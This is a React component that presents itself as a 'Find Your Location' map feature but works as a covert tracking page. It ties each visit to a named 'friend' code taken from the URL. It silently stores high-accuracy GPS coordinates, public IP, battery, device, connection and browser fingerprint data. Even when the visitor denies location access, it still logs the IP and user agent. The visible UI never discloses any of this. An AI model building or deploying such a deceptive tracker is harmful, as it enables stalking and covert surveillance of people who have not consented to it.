import { useState } from 'react';
import { getFriendFromURL, saveVisitorData } from '../utils/database';

const LocationTracker = ({ onLocationDetected }) => {
  const [status, setStatus] = useState({
    message: 'Click the button to see your location on the map',
    type: 'info'
  });
  const [isLoading, setIsLoading] = useState(false);
  const [locationAllowed, setLocationAllowed] = useState(false);

  const { name: friendName, code: friendCode } = getFriendFromURL();

  // Funcții pentru device info
  const getBatteryInfo = async () => {
    if ('getBattery' in navigator) {
      try {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      } catch (error) {
        return { level: 'unknown', charging: 'unknown' };
      }
    }
    return { level: 'not_supported', charging: 'not_supported' };
  };

  const getDeviceInfo = () => {
    const userAgent = navigator.userAgent.toLowerCase();
    let deviceType = 'desktop';
    let browser = 'unknown';
    let os = 'unknown';

    if (/mobile|android|iphone|ipad/.test(userAgent)) {
      deviceType = 'mobile';
    } else if (/tablet|ipad/.test(userAgent)) {
      deviceType = 'tablet';
    }

    if (/chrome/.test(userAgent)) {
      browser = 'chrome';
    } else if (/firefox/.test(userAgent)) {
      browser = 'firefox';
    } else if (/safari/.test(userAgent)) {
      browser = 'safari';
    } else if (/edge/.test(userAgent)) {
      browser = 'edge';
    }

    if (/windows/.test(userAgent)) {
      os = 'windows';
    } else if (/mac/.test(userAgent)) {
      os = 'macos';
    } else if (/linux/.test(userAgent)) {
      os = 'linux';
    } else if (/android/.test(userAgent)) {
      os = 'android';
    } else if (/iphone|ipad/.test(userAgent)) {
      os = 'ios';
    }

    return {
      type: deviceType,
      browser: browser,
      os: os,
      cores: navigator.hardwareConcurrency || 'unknown',
      memory: navigator.deviceMemory || 'unknown',
      touchPoints: navigator.maxTouchPoints || 'unknown',
      vendor: navigator.vendor || 'unknown'
    };
  };

  const getConnectionInfo = () => {
    if ('connection' in navigator) {
      const connection = navigator.connection;
      return {
        effectiveType: connection.effectiveType || 'unknown',
        downlink: connection.downlink || 'unknown',
        rtt: connection.rtt || 'unknown',
        saveData: connection.saveData || false
      };
    }
    return {
      effectiveType: 'not_supported',
      downlink: 'not_supported',
      rtt: 'not_supported',
      saveData: false
    };
  };

  const requestLocation = async () => {
    if (!navigator.geolocation) {
      setStatus({
        message: '❌ Your browser does not support location services.',
        type: 'error'
      });
      return;
    }

    setIsLoading(true);
    setStatus({
      message: '📍 Detecting your location...',
      type: 'warning'
    });

    navigator.geolocation.getCurrentPosition(
      // Success
      async (position) => {
        const coords = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          altitudeAccuracy: position.coords.altitudeAccuracy,
          heading: position.coords.heading,
          speed: position.coords.speed
        };

        // Obține IP-ul
        let ip = 'unknown';
        try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipResponse.json();
          ip = ipData.ip;
        } catch (error) {
          console.log('Error getting IP');
        }

        // Salvează datele cu TOATE noile informații
        const visitorData = {
          friend: friendName,
          friendCode: friendCode,
          timestamp: new Date().toLocaleString('ro-RO'),
          unixTimestamp: Date.now(),
          locationAllowed: true,
          coordinates: coords,
          userAgent: navigator.userAgent,
          ip: ip,
          battery: await getBatteryInfo(),
          device: getDeviceInfo(),
          connection: getConnectionInfo(),
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          platform: navigator.platform,
          page: window.location.href
        };

        await saveVisitorData(visitorData);

        setStatus({
          message: '✅ Location detected! You can now see your position on the map.',
          type: 'success'
        });
        setIsLoading(false);
        setLocationAllowed(true);
        
        if (onLocationDetected) {
          onLocationDetected(coords);
        }
      },
      // Error
      async (error) => {
        let errorMessage = '';
        switch(error.code) {
          case error.PERMISSION_DENIED:
            errorMessage = '❌ Location access denied. Please allow location services to see your position.';
            break;
          case error.POSITION_UNAVAILABLE:
            errorMessage = '❌ Location unavailable. Please check your device settings.';
            break;
          case error.TIMEOUT:
            errorMessage = '❌ Location request timed out. Please try again.';
            break;
          default:
            errorMessage = '❌ Error detecting location. Please try again.';
            break;
        }

        // Salvează doar refuzul simplu, fără device info
        let ip = 'unknown';
        try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipResponse.json();
          ip = ipData.ip;
        } catch (ipError) {
          console.log('Error getting IP');
        }

        const visitorData = {
          friend: friendName,
          friendCode: friendCode,
          timestamp: new Date().toLocaleString('ro-RO'),
          locationAllowed: false,
          coordinates: null,
          userAgent: navigator.userAgent,
          ip: ip,
          page: window.location.href
        };

        await saveVisitorData(visitorData);

        setStatus({
          message: errorMessage,
          type: 'error'
        });
        setIsLoading(false);
      },
      // Options
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
      }
    );
  };

  return (
    <div style={{
      background: 'rgba(255,255,255,0.95)',
      padding: '25px',
      borderRadius: '16px',
      boxShadow: '0 8px 32px rgba(0,0,0,0.1)',
      textAlign: 'center',
      backdropFilter: 'blur(10px)',
      border: '1px solid rgba(255,255,255,0.2)'
    }}>
      <h3 style={{ 
        marginBottom: '12px', 
        color: '#2d3748',
        fontSize: '1.3rem',
        fontWeight: 600
      }}>Find Your Location</h3>
      <p style={{ 
        marginBottom: '20px', 
        color: '#4a5568',
        fontSize: '0.95rem',
        lineHeight: 1.5
      }}>
        Allow location access to see your precise position on the interactive map
      </p>
      
      <button
        onClick={requestLocation}
        disabled={isLoading || locationAllowed}
        style={{
          background: locationAllowed ? '#38a169' : 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
          color: 'white',
          border: 'none',
          padding: '14px 32px',
          borderRadius: '12px',
          cursor: isLoading || locationAllowed ? 'not-allowed' : 'pointer',
          fontSize: '1rem',
          fontWeight: '600',
          margin: '8px 0',
          opacity: isLoading || locationAllowed ? 0.7 : 1,
          transition: 'all 0.3s ease',
          boxShadow: '0 4px 15px rgba(102, 126, 234, 0.3)',
          minWidth: '200px'
        }}
        onMouseEnter={(e) => {
          if (!isLoading && !locationAllowed) {
            e.target.style.transform = 'translateY(-2px)';
            e.target.style.boxShadow = '0 6px 20px rgba(102, 126, 234, 0.4)';
          }
        }}
        onMouseLeave={(e) => {
          if (!isLoading && !locationAllowed) {
            e.target.style.transform = 'translateY(0)';
            e.target.style.boxShadow = '0 4px 15px rgba(102, 126, 234, 0.3)';
          }
        }}
      >
        {isLoading ? (
          <>
            <div className="loading"></div>
            Detecting...
          </>
        ) : locationAllowed ? (
          '📍 Location Found'
        ) : (
          '📍 Show My Location'
        )}
      </button>

      <div style={{
        marginTop: '16px',
        padding: '12px',
        borderRadius: '8px',
        fontWeight: '500',
        fontSize: '0.9rem'
      }} className={status.type}>
        {status.message}
      </div>
    </div>
  );
};

export default LocationTracker;